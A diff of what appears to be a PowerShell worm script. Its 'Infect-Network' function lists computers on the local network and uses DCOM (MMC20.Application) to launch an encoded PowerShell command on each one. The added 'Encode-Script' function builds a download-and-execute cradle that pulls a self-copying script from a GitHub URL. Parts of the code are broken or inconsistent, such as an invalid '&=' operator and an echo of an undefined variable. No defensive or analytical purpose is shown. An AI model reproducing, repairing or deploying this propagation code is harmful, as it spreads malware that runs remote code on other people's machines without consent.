@@ -197,10 +197,20 @@ echo $NULL > $env:temp/powermng.dat
 function Infect-Network {
 $networked_computers = net view /all | Where-Object {$_ -like "*\\*"}
 foreach ($comp in $networked_computers) {
-$ips &= [System.Net.Dns]::GetHostAddresses("yourhosthere")
+$ips &= [System.Net.Dns]::GetHostAddresses($comp)
+}
+
+function Encode-Script {
+$link = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
+$bytes = [Text.Encoding]::Unicode.GetBytes($link)
+$enc = [Convert]::ToBase64String($bytes)
+$enc = "if (-NOT (Test-Path `$DestinationFile)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
+echo $base
 }
 
 foreach ($ip in $ips) {
 Invoke-DCOM -ComputerName $ip -Method MMC20.Application -Command "powershell -sta -executionpolicy unrestricted -enc $(Encode-Script) "
 }
 }
+if (Test-Path $DestinationFile) {exit}
+#if (-NOT (Test-Path $DestinationFile)) {
